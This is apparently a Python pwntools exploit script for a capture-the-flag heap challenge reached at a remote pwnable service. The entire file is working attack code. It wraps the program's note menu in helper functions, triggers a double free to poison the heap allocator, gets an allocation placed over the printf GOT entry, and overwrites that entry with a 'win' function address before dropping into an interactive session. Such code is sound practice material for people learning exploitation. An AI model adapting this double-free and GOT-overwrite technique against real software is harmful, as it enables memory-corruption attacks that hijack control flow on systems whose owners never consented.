from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30030)

win=0x40096c

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def malloc(size,note,title="A"*0x20):
	init(1)
	print(target.recvuntil(": "))
	target.sendline(str(size))
	print(target.recvuntil(": "))
	target.send(title)	
	print(target.recvuntil(": "))
	target.send(note)
	
def edit(index,note):
	init(2)
	print(target.recvuntil(": "))
	target.sendline(str(index))
	print(target.recvuntil("Title "))
	leaks=target.recvuntil(": ").strip(": ")[0x20:]
	target.send(note)
	return leaks

def free(index):
	init(3)
	print(target.recvuntil(": "))
	target.sendline(str(index))

def leak(index):
	init(4)	
	print(target.recvuntil(": "))
	target.sendline(str(index))
	leak1=target.recvuntil(" ").strip(" ")
	print(target.recvuntil(": "))
	leak2=target.recvline().strip("\n")
	return leak1,leak2
	

malloc(0x120,"A"*0x11f)#0
malloc(0x120,"A"*0x11f)#1
malloc(0x120,"A"*0x11f)#2
malloc(0x120,"A"*0x11f)#3
malloc(0x120,"A"*0x11f)#4
malloc(0x120,"A"*0x11f)#5
malloc(0x120,"A"*0x11f)#6
malloc(0x120,"A"*0x11f)#7
free(2)
free(0)
free(1)
free(0)
printf_got=0x602040
'''
leak1,leak2=leak(0)
heap_leak=u64(leak1[0x20:].ljust(8,"\x00"))
libc_leak=u64(leak2[0:6].ljust(8,"\x00"))
print(hex(heap_leak))
print(hex(libc_leak))
'''
malloc(0x120,p64(printf_got)+"A"*(0x11f-8))
malloc(0x120,"A"*0x11f)#1
malloc(0x120,"A"*0x11f)#2
malloc(0x120,p64(win)+"\n")

target.interactive()
	
	
	
	
